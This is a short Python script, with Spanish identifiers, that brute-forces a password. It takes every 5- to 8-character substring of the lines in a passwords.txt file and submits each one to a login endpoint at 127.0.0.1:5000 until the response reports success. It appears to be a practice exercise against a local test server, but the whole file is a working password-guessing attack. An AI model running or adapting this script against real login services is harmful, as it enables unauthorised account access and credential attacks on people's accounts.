import requests

def extraer_subcadenas(texto, longitudes=(5, 6, 7, 8)):
    subcadenas = []
    for longitud in longitudes:
        for i in range(len(texto) - longitud + 1):
            subcadenas.append(texto[i:i + longitud])
    return subcadenas

def procesar_archivo(ruta_archivo):
    resultados = []
    with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
        for linea in archivo:
            linea = linea.strip()
            if linea:  
                resultados.extend(extraer_subcadenas(linea))
    return resultados

if __name__ == '__main__':
    ruta = 'passwords.txt'  
    subcadenas = procesar_archivo(ruta)
    for s in subcadenas:
        response = requests.get(f"http://127.0.0.1:5000/login?password={s}") 
        #print(s)
        #print(response.json()) 
        if (response.json()['acerto'] == True):
            print(response.json()) 
            break
        
    print("Proceso finalizado")

